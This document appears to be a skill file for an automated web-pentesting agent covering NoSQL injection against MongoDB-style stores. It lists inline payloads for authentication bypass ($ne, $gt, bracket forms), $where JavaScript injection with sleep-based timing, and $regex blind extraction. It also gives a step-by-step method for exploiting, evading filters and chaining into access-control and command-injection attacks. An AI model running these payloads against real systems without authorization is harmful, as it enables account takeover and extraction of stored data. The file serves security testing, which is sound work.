---
name: web-nosql-injection
description: >
  Detect and exploit NoSQL injection (operator / query injection). USE WHEN a
  param, JSON body or login form reaches a document store (MongoDB, and
  Mongo-shaped query layers) and responses shift under operator injection. Covers
  authentication bypass ( {"$ne": null} / {"$gt": ""} ), operator injection
  ($ne / $gt / $regex / $in), server-side JavaScript injection ($where / mapReduce),
  and blind boolean/time-based extraction of field values.
tags: [web, injection, nosqli, nosql, mongodb, blind, owasp-a03]
tools: [httpx, nuclei, ffuf]
payloads:
  - {kind: glob, path: "vendor/PayloadsAllTheThings/NoSQL Injection/**/*.txt", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: glob, path: "vendor/PayloadsAllTheThings/NoSQL Injection/*.md", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: inline, inline: ["{\"$ne\": null}", "{\"$gt\": \"\"}", "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "username[$ne]=x&password[$ne]=x", "{\"$regex\": \"^admin\"}", "admin' || '1'=='1", "{\"$where\": \"return true\"}", "{\"$where\": \"sleep(10000)\"}", "'; return true; var x='", "{\"$in\": [\"admin\", \"root\"]}"], license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
verification:
  kind: differential
  expect: {signal: any, min_len_delta: 16}
  signals:
    - "$ne"
    - "$where"
    - "MongoError"
    - "unterminated string"
references:
  - https://portswigger.net/web-security/nosql-injection
  - https://owasp.org/www-community/attacks/NoSQL_Injection
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
license: AGPL-3.0-or-later
version: 1.0.0
---
# NoSQL Injection — operator & query injection

Prove that attacker input changes the *query semantics* of a document store. The
0-FP discipline: a login that succeeds once could be a valid guess — the proof is a
**deterministic differential** between a TRUE and a FALSE payload (auth
denied→accepted, or boolean length/status divergence), or a **controlled `$where`
time delay**. Never a lone error string.

## Sub-variants
- **Authentication bypass** — replace a credential with an always-true operator
  object: `{"$ne": null}`, `{"$gt": ""}`, or the bracket form
  `username[$ne]=x&password[$ne]=x` on urlencoded bodies.
- **Operator injection** — smuggle `$ne`, `$gt`, `$lt`, `$in`, `$regex` into a
  filter to widen or invert it.
- **`$regex` blind exfil** — anchor `^` and walk the alphabet to extract a field
  char-by-char via boolean responses.
- **Server-side JS (`$where` / `mapReduce`)** — inject `return true` for boolean,
  `sleep(10000)` for time-based blind.
- **Syntax break** — `'`, `"`, `\`, `{`, `;` to trigger a `MongoError` /
  `unterminated string` (recon signal, not proof).

## Methodology (recon → probe → confirm → exploit → chain)
1. **Recon.** `exec` capture login and search/filter flows. Note `Content-Type`:
   JSON bodies enable object injection (`{"$ne":...}`); urlencoded bodies enable
   bracket injection (`param[$ne]=`). `decode` nested/base64 values.
2. **Probe.** Send a syntax-break set (`'`, `"`, `\`) and watch for a `MongoError`
   or a behavioural shift. Then submit the operator object in place of a value.
3. **Confirm (deterministic).**
   - *Differential (primary, `verify.py` default):* pair a TRUE payload
     (`{"$ne": null}`) against a FALSE one (`{"$eq": "definitely-not-a-value"}`)
     and `compare` the two flows. Auth flip (403/`login failed` → 200/session) or
     a boolean status/length delta = confirmed. Set `signal: status_change` for
     auth bypass, `length_delta` for boolean-blind.
   - *Timing (fallback):* inject `{"$where": "sleep(10000)"}` and the `timing`
     oracle asserts the delayed response crosses `threshold_ms`.
4. **Exploit.** With auth bypass, enumerate accounts via `$regex` username walk;
   with `$where`, extract field values char-by-char under the boolean/timing oracle.
5. **Evasion.** Filters stripping `$` → try unicode/dotted keys, array wrapping,
   or type juggling (`password=x` vs `password[$ne]=x`). Re-run the differential.

## Cross-chain notes
- NoSQL auth bypass → session as another user → `web-idor-bola` / `web-access-control`.
- `$where` JS injection can pivot to command execution on misconfigured engines →
  share the OOB host with `web-command-injection`.
- Shares the boolean/time-blind extraction pattern with `web-sqli` (which also
  covers Mongo operators) — use whichever oracle the sink permits.

## False-positive traps
- A single successful login with `{"$ne":null}` is weak — pair it with a
  guaranteed-FALSE operator and prove the *flip*. Same account may simply have that
  password.
- A `MongoError` reflected in the page is a hint, not a finding — it proves parsing
  broke, not that you controlled the query result.
- `$regex` matching everyone equally (no per-char divergence) is not exfil.

## Key payload sources
- PortSwigger NoSQL injection labs / cheat sheet — `references`.
- `vendor/PayloadsAllTheThings/NoSQL Injection/` (auth-bypass objects, bracket
  forms, `$regex` extraction, `$where` JS, error strings).

## Verification oracle
Primary `differential` (TRUE vs FALSE payload — auth denied→accepted or boolean
length/status delta). Fallback `timing` (`$where: sleep`). `verify.py` selects the
strongest oracle the caller wired inputs for; an unpaired success or a lone error
string is rejected.
